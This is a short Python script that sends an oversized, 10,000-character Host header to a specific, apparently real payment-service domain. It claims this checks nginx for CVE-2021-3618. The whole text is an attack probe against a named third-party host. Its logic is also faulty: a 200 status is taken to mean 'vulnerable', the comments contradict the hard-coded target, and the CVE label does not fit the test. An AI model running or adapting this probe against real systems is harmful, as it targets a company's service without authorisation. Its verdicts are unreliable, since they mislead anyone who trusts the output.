import requests

# Replace the IP address and port with the address of your nginx server
url = "https://acl.pathaopay.com/"

# Send a GET request with a specially crafted request header that triggers the vulnerability
headers = {"Host": "acl.pathaopay.com" + "A" * 10000}
response = requests.get(url, headers=headers)

# Check the server response for any unexpected behavior or error messages
if response.status_code == 200:
    print("The server is vulnerable to CVE-2021-3618")
else:
    print("The server is not vulnerable to CVE-2021-3618")
    
# Print the server response content
print("Response content:")
print(response.text)
